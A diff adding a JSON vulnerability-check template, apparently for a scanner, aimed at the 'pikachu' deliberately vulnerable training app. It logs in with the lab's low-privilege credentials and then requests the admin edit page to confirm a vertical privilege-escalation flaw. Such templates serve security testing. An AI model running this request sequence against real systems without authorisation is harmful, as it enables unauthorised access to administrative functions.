@@ -1,0 +1,43 @@
+{
+    "name": "pikachu",
+    "vuln": "op2_login",
+    "version": "",
+    "comment": "仅需要多次发包验证的设置mainRequest字段2,否则都以1为准,多次发包依次延续",
+    "type": "3",
+    "mainRequest": {
+        "1": {
+            "request": {
+                "host": "",
+                "method": "POST",
+                "path": "/vul/overpermission/op2/op2_login.php",
+                "cookie": "",
+                "requestheader": {"Content-Type": "application/x-www-form-urlencoded"},
+                "requestbody": "username=pikachu&password=000000&submit=Login"
+            },
+            "response": {
+                "statuscode": 200,
+                "statusmessage": "",
+                "responsetime": "",
+                "responseheader": "",
+                "responsebody": "欢迎来到后台管理中心,您只有查看权限!"
+            }
+        },
+        "2": {
+            "request": {
+                "host": "",
+                "method": "GET",
+                "path": "/vul/overpermission/op2/op2_admin_edit.php",
+                "cookie": "",
+                "requestheader": "",
+                "requestbody": ""
+            },
+            "response": {
+                "statuscode": 200,
+                "statusmessage": "",
+                "responsetime": "",
+                "responseheader": "",
+                "responsebody": "hi,pikachu,欢迎来到后台管理中心"
+            }
+        }
+    }
+}
